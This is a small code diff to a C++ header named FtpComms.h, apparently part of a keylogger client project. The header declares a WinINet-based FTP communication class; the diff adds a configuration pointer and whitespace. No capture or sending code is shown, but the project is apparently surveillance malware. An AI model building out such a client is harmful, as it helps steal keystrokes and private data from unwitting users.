@@ -1,8 +1,9 @@
+// KeyLoggerClient/include/communication/FtpComms.h
 #ifndef FTPCOMMS_H
 #define FTPCOMMS_H
 
 #include "communication/BaseComms.h"
-#include <windows.h>
+#include <windows.h>    
 #include <wininet.h>
 
 class Configuration;
@@ -19,6 +20,7 @@ public:
     std::vector<uint8_t> ReceiveData() override;
     
 private:
+    Configuration* m_config;
     HINTERNET m_hInternet;
     HINTERNET m_hConnect;
 };
